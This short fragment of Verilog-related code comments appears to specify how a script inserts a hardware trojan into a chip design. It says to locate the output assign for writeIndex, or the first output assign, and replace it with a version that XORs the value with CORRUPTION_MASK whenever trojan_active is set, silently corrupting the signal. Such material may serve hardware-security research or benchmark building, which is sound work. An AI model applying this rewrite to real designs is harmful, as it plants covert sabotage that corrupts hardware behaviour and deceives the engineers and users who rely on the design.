...
//
// IMPORTANT: writeIndex may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If writeIndex is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for writeIndex (or first output assign):
//     assign writeIndex = <expr>;
//   Replace with:
//     assign writeIndex = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
